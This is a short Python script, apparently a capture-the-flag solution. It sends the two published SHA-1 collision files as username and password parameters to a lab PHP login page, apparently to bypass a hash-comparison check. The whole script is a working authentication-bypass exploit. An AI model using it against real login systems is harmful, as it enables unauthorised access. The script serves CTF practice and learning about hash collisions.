import requests

# Fetching 2 pdf's file which cause SHA-1 collision

pdf1 = requests.get("http://localhost/shattered-1.dat")

pdf2 = requests.get("http://localhost/shattered-2.dat")

# Assinging pdf's content into the GET parameters

params = {'user': pdf1.content, 'pass': pdf2.content}

r = requests.get("http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/",params=params)

print (r.text)
